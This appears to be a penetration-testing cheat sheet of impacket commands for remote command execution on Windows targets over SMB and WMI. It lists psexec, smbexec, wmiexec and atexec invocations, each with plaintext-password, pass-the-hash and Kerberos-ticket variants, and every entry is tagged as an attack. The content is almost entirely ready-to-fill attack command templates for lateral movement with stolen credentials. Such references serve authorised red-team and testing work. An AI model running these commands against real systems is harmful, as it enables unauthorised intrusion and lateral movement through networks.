# impacket

% impacket, windows, exec

## PSEXEC with username
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
impacket-psexec <domain>/<user>:<password>@<target_ip>
```

## PSEXEC with pass the Hash (pth)
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
impacket-psexec -hashes 00000000000000000000000000000000:<nthash> <user>@<target_ip>
```

## PSEXEC - PTH to internal via external IP
```
impacket-psexec -hashes 00000000000000000000000000000000:<nthash> -port <port|445> -target-ip <external_ip> <user>@<internal_ip>
```

## PSEXEC with kerberos
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
export KRB5CCNAME=<ccache_file>; impacket-psexec -dc-ip <dc_ip> -target-ip <target_ip> -no-pass -k <domain>/<user>@<target_name>
```

## SMBEXEC with username
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
smbexec.py <domain>/<user>:<password>@<target_ip>
```

## SMBEXEC with pass the Hash (pth)
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
smbexec.py -hashes <nthash> <user>@<target_ip>
```

## SMBEXEC with kerberos
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
export KRB5CCNAME=<ccache_file>; smbexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
```

## wmiexec
#platform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
Execute a command shell without touching the disk or running a new service using DCOM

```
wmiexec.py <domain>/<user>:<password>@<ip>
```

## wmiexec  with pass the hash (pth) 
#platform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  

Execute a command shell without touching the disk or running a new service using DCOM

```
wmiexec.py -hashes <nthash> <user>@<ip>
```

## atexec - execute command view the task scheduler 
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Using \pipe\atsvc via SMB

```
atexec.py <domain>/<user>:<password>@<ip> "command"
```

## atexec pass the hash (pth)
#platform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Execute command view the task scheduler (using \pipe\atsvc via SMB)

```
atexec.py -hashes <nthash> <user>@<ip> "command"
```
